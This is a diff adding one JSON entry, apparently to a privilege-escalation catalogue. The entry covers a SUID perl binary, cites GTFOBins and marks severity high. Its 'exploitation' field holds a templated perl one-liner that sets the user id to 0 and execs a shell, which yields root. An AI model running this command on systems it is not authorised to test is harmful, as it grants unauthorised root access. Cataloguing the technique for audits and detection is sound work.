@@ -1,0 +1,11 @@
+{
+  "id": "suid_perl",
+  "category": "SUID_GTFOBINS",
+  "binary": "perl",
+  "cve": null,
+  "exploitation": ["{{binary}} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"{{shell}}\";'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
